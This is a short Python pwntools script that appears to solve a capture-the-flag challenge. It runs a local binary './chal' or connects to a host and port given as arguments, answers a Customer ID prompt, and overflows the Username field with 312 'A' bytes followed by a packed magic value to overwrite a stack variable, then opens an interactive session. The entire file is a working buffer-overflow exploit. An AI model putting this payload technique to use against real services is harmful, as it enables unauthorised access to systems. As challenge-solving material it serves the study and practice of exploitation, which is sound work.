from pwn import *
import sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

magic = 0xff293a6365737963
payload = b'A' * 312 + p64(magic)

p.recvuntil(b'Enter you Customer ID : ')
p.sendline(b'0')
p.recvuntil(b'Enter your Username : ')
p.sendline(payload)

p.interactive()
